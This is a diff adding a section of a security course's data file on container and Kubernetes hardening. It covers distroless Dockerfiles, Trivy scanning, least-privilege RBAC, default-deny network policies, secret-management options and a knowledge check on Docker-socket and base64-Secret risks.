+USER nonroot:nonroot
+
+# 4. EXPOSE only the port you actually need
+EXPOSE 3000
+
+# 5. No secrets in the image — never ENV SECRET=value
+# Inject secrets at runtime via secret manager, not Dockerfile
+CMD ["server.js"]
+\`\`\`
+
+**What distroless means:** no shell (\`/bin/sh\`), no \`apt\`/\`yum\`, no debugging tools — dramatically reduces the attack surface if a vulnerability is exploited, because the attacker has no tools to work with.
+
+### 🔍 Container scanning with Trivy
+
+Run Trivy in CI to break the build on unpatched CRITICAL vulnerabilities:
+
+\`\`\`bash
+# Install (macOS)
+brew install trivy
+
+# Scan a Dockerfile for misconfigurations
+trivy config ./Dockerfile
+
+# Scan the built image for OS + package CVEs
+trivy image --exit-code 1 --severity CRITICAL,HIGH my-app:latest
+
+# Scan a local directory (for SCA)
+trivy fs . --scanners vuln,secret,misconfig
+\`\`\`
+
+The \`--exit-code 1\` flag makes Trivy exit non-zero on findings — wire this into your CI \`push\` workflow to block deployment of vulnerable images.
+
+### 🏗️ Kubernetes security fundamentals
+
+**RBAC: least-privilege service accounts**
+
+Every Pod runs with a service account. By default that account can call the Kubernetes API. Create dedicated service accounts with only the permissions each workload needs:
+
+\`\`\`yaml
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: app-service-account
+  namespace: production
+automountServiceAccountToken: false   # opt-in only if the app needs K8s API access
+---
+# Grant only what is needed
+apiVersion: rbac.authorization.k8s.io/v1
+kind: Role
+metadata:
+  name: app-role
+  namespace: production
+rules:
+  - apiGroups: [""]
+    resources: ["configmaps"]
+    resourceNames: ["app-config"]     # named resource — not wildcard
+    verbs: ["get"]
+\`\`\`
+
+**Network Policies: default-deny**
+
+Without a NetworkPolicy, every Pod can reach every other Pod in the cluster. Start with a default-deny and explicitly allow what you need:
+
+\`\`\`yaml
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: default-deny-ingress
+  namespace: production
+spec:
+  podSelector: {}           # selects all pods in the namespace
+  policyTypes:
+    - Ingress
+    # Ingress rules block all incoming traffic unless explicitly permitted
+\`\`\`
+
+**Pod Security Standards (enforce restricted)**
+
+\`\`\`yaml
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: production
+  labels:
+    pod-security.kubernetes.io/enforce: restricted   # blocks privileged, root, hostPath
+    pod-security.kubernetes.io/warn: restricted
+\`\`\`
+
+**Secrets: environment variables vs Kubernetes Secrets vs external managers**
+
+| Method | Risk |
+|--------|------|
+| \`ENV SECRET=value\` in Dockerfile | Baked into every image layer — visible in \`docker history\` |
+| Plain env var in Pod spec | Stored in etcd (unencrypted unless etcd encryption-at-rest is configured); visible to anyone with read Pod access |
+| Kubernetes Secret (base64) | Same etcd risk; base64 is NOT encryption |
+| External Secret Operator (ESO) | Syncs from AWS Secrets Manager / GCP Secret Manager / Vault into a K8s Secret; source of truth is the secret manager |
+| Sidecar injection (Vault Agent) | Writes secrets to an in-memory volume; never touches etcd |
+
+For production: use an external secret manager as the source of truth and inject via ESO or a Vault sidecar. At minimum, enable **etcd encryption-at-rest** in your cluster configuration.
+
+### 🔑 Security tools
+
+\`\`\`bash
+# Trivy — container and K8s misconfiguration scanning
+trivy k8s --report summary cluster
+
+# kube-bench — checks cluster against CIS Kubernetes Benchmark
+kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml
+
+# kubesec — static analysis of K8s manifests
+kubesec scan pod.yaml
+
+# Polaris — policy engine for K8s best practices
+helm install polaris fairwinds-stable/polaris
+\`\`\`
+
+### Real-world case: Tesla Kubernetes dashboard (2018)
+
+A Kubernetes dashboard was exposed to the internet without authentication. An attacker discovered it, found AWS credentials stored as plain environment variables in a Pod, used those to access an S3 bucket containing telemetry data, and installed a cryptominer. **Lessons:** never expose the K8s dashboard publicly, never store secrets as plain env vars, enable RBAC, and rotate credentials after any suspected exposure.
+
+➡️ **Next step (Phase 8 complete):** You can ship safely and harden your containers and cluster. Prevention eventually fails — the next phase builds the layer that *catches* failures: structured logging, detection, and incident response. Continue to **Phase 9: Logging, Monitoring, and Incident Response**.`,
+    tracker: [
+      "Can write a hardened multi-stage Dockerfile with non-root USER, distroless runtime, and no secrets in layers",
+      "Has run Trivy against a Dockerfile or image and interpreted CVE and misconfiguration output",
+      "Understands why mounting the Docker socket is a container-escape risk",
+      "Can write a Kubernetes NetworkPolicy that denies all ingress by default",
+      "Knows the difference between K8s Secrets (base64, etcd), ESO, and Vault Agent for secret injection",
+      "Can explain why `pod-security.kubernetes.io/enforce: restricted` prevents the most common container misconfigurations",
+      "Answered the knowledge check"
+    ],
+    knowledgeCheck: [
+      {
+        q: "A container runs as root and has `-v /var/run/docker.sock:/var/run/docker.sock` mounted. Why is this a critical misconfiguration?",
+        a: "The Docker socket grants full control over the Docker daemon. Any process inside the container can use it to create a new privileged container with the host filesystem mounted, then chroot or exec into that to read, write, or execute anything on the host. Mounting the Docker socket is functionally equivalent to giving the container root access to the host — it completely undermines container isolation."
+      },
+      {
+        q: "A developer stores a database password as a Kubernetes Secret and says 'it's fine because Secrets are base64-encoded.' What is wrong with this reasoning?",
+        a: "Base64 is an encoding, not encryption — it adds no confidentiality whatsoever. Kubernetes Secrets are stored in etcd, and unless etcd encryption-at-rest is explicitly configured, the base64-decoded value is readable by anyone with etcd access, raw etcd backups, or sufficient RBAC permissions to read the Secret. The right approach is to enable etcd encryption-at-rest AND use an external secret manager (AWS Secrets Manager, GCP Secret Manager, HashiCorp Vault) as the authoritative source, synced in via the External Secrets Operator."
+      }
+    ]
   },
   {
     id: "m9_1",
